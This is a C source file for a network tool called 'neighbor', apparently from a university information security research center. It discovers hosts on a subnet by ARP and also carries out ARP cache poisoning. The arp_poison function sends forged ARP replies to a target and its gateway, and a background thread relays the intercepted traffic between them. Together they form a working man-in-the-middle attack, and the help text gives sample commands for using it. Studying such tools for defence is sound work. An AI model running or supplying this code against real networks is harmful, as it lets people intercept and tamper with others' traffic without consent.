/********************************************************************
 ** Copyright(c) 2016,哈尔滨工程大学信息安全研究中心
 ** All rights reserved
 **
 ** 文件名：arp_probe.c
 ** 创建人：路泽亚
 ** 描  述：arp探测
 ** 注  意：1.
 **
 ** 当前版本： v1.0
 ** 作    者：路泽亚
 ** 完成日期： 2016-04-18
 ********************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <stdarg.h>
#include <pthread.h>
#include <unistd.h>

#include "define.h"
#include "utils.h"
#include "capture.h"
#include "getarg.h"
#include "utime.h"

#include "l1.h"
#include "ethernet.h"
#include "arp.h"
#include "ip.h"

#define ARP_REQUEST_LEN 60
#define ARP_REPLY_LEN   60

/* 打开的句柄 */
static cap_t *arp_cap;

/* 默认值 */
static char*    host_if      = "eth0";
static uint32_t host_netmask = 0;
static uint8_t  host_mac[6]  = {0};
static uint32_t host_ip      = 0;

/* 以ms为单位（尽管可以精确到us） */
static uint32_t timeout       = 100;
static int      verbose_level = 0;
/* 0为探测子网主机（默认），1为探测指定主机，2为arp缓存投毒 */
static int      run_level     = 0;

/* 需要设置的值 */
static uint32_t probe_ip     = 0;
static uint8_t  probe_mac[6] = {0};
static uint8_t  packet[PACKET_MAX_LEN];
static uint16_t packet_len;

/* arp poison使用变量 */
static int      arp_poison_break = 0;
static uint32_t gateway_ip = 0;
static uint32_t target_ip  = 0;
static uint8_t  target_mac[6];
static uint8_t  gateway_mac[6];

static void verify_variable();
static void parse_args(int argc, char *argv[]);
static void probe_host();
static void probe_subnet();
static void print_help();
static void verbose(char *msg, ...);
static void arp_poison();
static void* arp_poison_normal(void* nouse);

int main(int argc, char *argv[])
{
    parse_args(argc, argv);
    /* 初始化 */
    arp_cap = cap_init(host_if, 1);
    if (!arp_cap) {
        printf("neighbor初始化失败!\n");
        exit(-1);
    }
    verify_variable();
    if (run_level == 0) {
        probe_subnet();
    } else if (run_level == 1) {
        probe_host();
    } else {
        if (!arp_poison_break) {
            pthread_t th;
            pthread_create(&th, NULL,  arp_poison_normal, NULL);
        }
        arp_poison();
    }
    return 0;
}

/**
 * 命令行参数
 * -a 向网络中每一台机器都发送arp请求包，生成arp cache，并输出
 * -p 指定机器ip进行探测，不能与-a共存
 * -t 设定超时时间
 * -m 设定主机mac地址，不设定则为默认接口的mac
 * -l 设定主机ip地址，不设定则为默认接口的ip
 * -n 设定子网掩码，只用输入位数即可
 * -i 设定接口，默认eth0
 * -v verbose
 * -q arp缓存投毒的目标ip
 * -g arp缓存投毒的网关ip
 * -b arp缓存投毒时的正常流量不允许通过(ip层以上)
 */
static void parse_args(int argc, char *argv[])
{
    int p;
    while ((p = getarg(argc, argv, "at:l:m:i:p:vn:q:g:b")) != -1) {
        /* TODO: 加上ip地址的验证 */
        /* TODO: 加上mac地址的验证 */
        switch(p) {
        case 'a':
            run_level = 0;
            break;
        case 'p':
            probe_ip = ipv4_addr(optarg);
            run_level = 1;
            break;
        case 'l':
            host_ip = ipv4_addr(optarg);
            break;
        case 'm':
            mac_addr(optarg, host_mac);
            break;
        case 'n':
            host_netmask = ipv4_netmask(atoi(optarg));
            break;
        case 'i':
            host_if = optarg;
            break;
        case 'v':
            verbose_level = 1;
            break;
        case 't':
            timeout = atoi(optarg);
            break;
        case 'q':
            run_level = 2;
            target_ip = ipv4_addr(optarg);
            break;
        case 'g':
            run_level = 2;
            gateway_ip = ipv4_addr(optarg);
            break;
        case 'b':
            arp_poison_break = 1;
            break;
        default:
            /* p == ? */
            printf("Error: Invaild syntax\n\n");
            print_help();
            exit(-1);
        }
    }
}

static void verify_variable()
{
    uint8_t null_mac[6] = {0};
    if (memcmp(host_mac, null_mac, 6) == 0) {
        if (-1 == cap_getdev_ifhwaddr(arp_cap->sockfd,
                                      arp_cap->ifdevice,
                                      host_mac)) {
            printf("%s 获取设备mac地址出错。\n", arp_cap->ifdevice);
            exit(-1);
        }
    }
    verbose("%s的mac地址为: %s\n", host_if, mac_ntoa(host_mac));
    if (host_ip == 0) {
        host_ip = cap_getdev_ifaddr(arp_cap->sockfd, arp_cap->ifdevice);
        if (!host_ip) {
            printf("%s 获取设备ip地址出错，请设置ip地址。\n", arp_cap->ifdevice);
            exit(-1);
        }
    }
    verbose("%s的ip地址为: %s\n", host_if, ipv4_ntoa(host_ip));
    if (host_netmask == 0) {
        host_netmask = cap_getdev_ifnetmask(arp_cap->sockfd,
                                            arp_cap->ifdevice);
        if (!host_netmask) {
            printf("%s 获取设备子网掩码出错，请设置netmask。\n",
                   arp_cap->ifdevice);
            exit(-1);
        }
    }
    verbose("%s的netmask为: %s\n", host_if, ipv4_ntoa(host_netmask));
}

static void probe_host()
{
    uint8_t buf[ARP_REQUEST_LEN];
    struct utime start, end;

    if (!arp_cap)
        exit(-1);
    build_arp_request(buf, ARP_REQUEST_LEN, host_mac, host_ip, probe_ip);
    if (-1 == cap_send(arp_cap, buf, ARP_REQUEST_LEN)) {
        printf("发送失败!\n");
        exit(-1);
    }
    verbose("开始发送请求包！\n");
    utime_get(&start);
    while (1) {
        cap_capture(arp_cap, packet, &packet_len);
        if (analysis_isarp(packet)) {
            ARP *arp = (ARP*)(packet + sizeof(ETHER));
            ARP_V4BODY *body = (ARP_V4BODY*)(packet + sizeof(ARP) + sizeof(ETHER));
            if (arp->arp_hrd == hton16(ARPHRDTYPE_ETHER)  &&
                arp->arp_pro == hton16(ARPPROTYPE_IP) &&
                arp->arp_pln == 0x4 &&
                arp->arp_op  == hton16(ARPOPCODE_REPLY) &&
                memcmp(body->arp_dhwaddr, host_mac, 6) == 0 &&
                body->arp_dipaddr == host_ip &&
                body->arp_sipaddr == probe_ip) {
                memcpy(probe_mac, body->arp_shwaddr, 6);
                verbose("接受到回应！\n");
                printf("%s对应的mac地址为 %s\n", ipv4_ntoa(probe_ip),
                       mac_ntoa(probe_mac));
                break;
            }
        }
        utime_get(&end);
        if (end.usec - start.usec >= (timeout * 1000)) {
            verbose("没有收到响应包!\n");
            printf("无法探测%s！\n", ipv4_ntoa(probe_ip));
            memset(probe_mac, 0, 6);
            break;
        }
    }
}

static int probe_subnet_callback(uint32_t ip)
{
    probe_ip = ip;
    verbose("探测主机%s\n", ipv4_ntoa(probe_ip));
    probe_host();
    return 0;
}

static void probe_subnet()
{
    verbose("开始探测子网%s/%d\n", ipv4_ntoa(host_ip),
            ipv4_count(host_netmask));
    ipv4_walk_host(host_ip, host_netmask, probe_subnet_callback);
}

static void print_help()
{
    printf("neighbor v1.0\n");
    printf("written by James Lu.\n");
    printf("\
-a  \t\t向网络中每一台机器都发送arp请求包，生成arp cache，并输出 \n\
-p: \t\t指定机器ip进行探测，不能与-a共存\n\
-t: \t\t设定超时时间\n\
-m: \t\t设定主机mac地址，不设定则为默认接口的mac\n\
-l: \t\t设定主机ip地址，不设定则为默认接口的ip\n\
-n: \t\t设定子网掩码，只用输入位数即可\n\
-i: \t\t设定接口，默认eth0\n\
-v  \t\tverbose\n\
-q: \t\tarp缓存投毒的目标ip\n\
-g: \t\tarp缓存投毒的网关ip\n");
    printf("eg. \n");
    printf("1.发包时更改本地主机与网卡mac（伪造），应与其余功能一起使用\n");
    printf("\tneighbor -i eth0 -l 192.168.100.56 -m ff:ff:ff:ff:ff:ff -n 24\n");
    printf("2.探测子网内主机mac\n");
    printf("\tneighbor -a\n");
    printf("3.探测指定主机的mac\n");
    printf("\tneighbor -p 192.168.100.53\n");
    printf("4.arp缓存投毒\n");
    printf("\tneighbor -q 192.168.100.53 -g 192.168.103.1\n");
    printf("5.设定发包之后收包的超时时间，以ms为单位\n");
    printf("\tneighbor -t 100\n");
    printf("6.调试输出\n");
    printf("\tneighbor -v\n");
}

static void verbose(char *msg, ...)
{
    va_list va;
    va_start(va, msg);
    if (verbose_level) {
        vprintf(msg, va);
    }
    va_end(va);
}

/* ========================== arp poison ======================= */
static void arp_poison()
{
    uint8_t buf[ARP_REPLY_LEN];
    uint8_t null_mac[6] = {0};

    if (target_ip == 0 || gateway_ip == 0) {
        printf("请输入目标ip与网关ip\n");
        printf("eg. neighbor -q 192.168.100.53 -g 192.168.103.1\n");
        exit(-1);
    }
    /* 探测目标机mac */
    verbose("探测目标机mac。。。\n");
    probe_ip = target_ip;
    probe_host();
    if (memcmp(probe_mac, null_mac, 6) == 0)
        exit(-1);
    memcpy(target_mac, probe_mac, 6);

    verbose("探测网关mac。。。\n");
    probe_ip = gateway_ip;
    probe_host();
    if (memcmp(probe_mac, null_mac, 6) == 0)
        exit(-1);
    memcpy(gateway_mac, probe_mac, 6);

    /* 构造响应包 */
    while (1) {
        verbose("发送响应包以改变目标机arp缓存\n");
        build_arp_reply(buf, ARP_REPLY_LEN, host_mac, target_mac,
                        gateway_ip, target_ip);
        cap_send(arp_cap, buf, ARP_REPLY_LEN);
        verbose("发送完毕\n");

        verbose("发送响应包以改变网关的arp缓存\n");
        build_arp_reply(buf, ARP_REPLY_LEN, host_mac, gateway_mac,
                        target_ip, gateway_ip);
        cap_send(arp_cap, buf, ARP_REPLY_LEN);
        verbose("发送完毕\n");
        sleep(1);
    }
}

/* 维持这正常流量
 * 需要更改ip层以上的包的以太网部分
 * 将目的主机发来的包的源mac改为自己的mac，目的mac改为网关的mac
 * 将网关发来的包的源mac改为自己的mac，目的mac改为目标机的mac*/
static void* arp_poison_normal(void* nouse)
{
    sleep(1);
    while (1) {
        cap_capture(arp_cap, packet, &packet_len);
        if (analysis_isip(packet)) {
            ETHER *ether = (ETHER*)packet;
            IP *ip = (IP*)(packet + sizeof(ETHER));
            if (ip->ip_src == target_ip &&
                memcmp(ether->ether_dst, host_mac, 6) == 0 &&
                memcmp(ether->ether_src, target_mac, 6) == 0) {
                /* 目的主机发来的包 */
                memcpy(ether->ether_src, host_mac, 6);
                memcpy(ether->ether_dst, gateway_mac, 6);
                int len = cap_send(arp_cap, packet, packet_len);
                printf("len: %d\n", len);
            } else if (ip->ip_dst == target_ip &&
                       memcmp(ether->ether_dst, host_mac, 6) == 0 &&
                       memcmp(ether->ether_src, gateway_mac, 6) == 0) {
                /* 网关发来的包 */
                memcpy(ether->ether_src, host_mac, 6);
                memcpy(ether->ether_dst, target_mac, 6);
                int len = cap_send(arp_cap, packet, packet_len);
                printf("len: %d\n", len);
            }
        }
    }
    return NULL;
}